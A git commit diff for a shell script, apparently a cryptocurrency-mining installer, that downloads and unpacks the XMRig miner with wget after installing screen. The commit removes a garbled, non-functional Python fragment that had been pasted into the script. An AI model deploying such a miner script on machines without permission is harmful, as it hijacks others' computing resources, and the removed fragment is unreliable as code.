5cd65802ff614f43bc4ef404c47401bc3884a872
Server048 <64312413+Server048@users.noreply.github.com>
2021-05-08 10:39:49 +0800

    Update baguscoin.sh

--- baguscoin.sh
+++ baguscoin.sh
@@ -13,25 +13,9 @@ figlet -f big Done !!! | lolcat
 echo
 echo -e "\e[1m Xrig Coin By Server048"
 echo
-echo -e "\e[1m\e[32m Developed by :\e[33m Server048 (8h4i)"
-z="
-try:
-	
-	import mechanize, requests, random, sys, os, re
-	from time import sleep
-	from cookielib import LWPCookieJar as Cookie
-	from requests.exceptions import ConnectionError
-	os.system('clear')
-	def Tik(s):
-		for i in s + '\n':
-			sys.stdout.write(i)
-			sys.stdout.flush()
-			sleep(random.random() * 0.0010)
-      
-      
-      figlet -f big Running | lolcat
-  clear
-
+echo -e "\e[1m\e[32m Developed by :\e[33m Server048 (Bitcoin)"
+figlet -f big Running | lolcat
+clear
 apt update
 apt install screen -y
 wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3
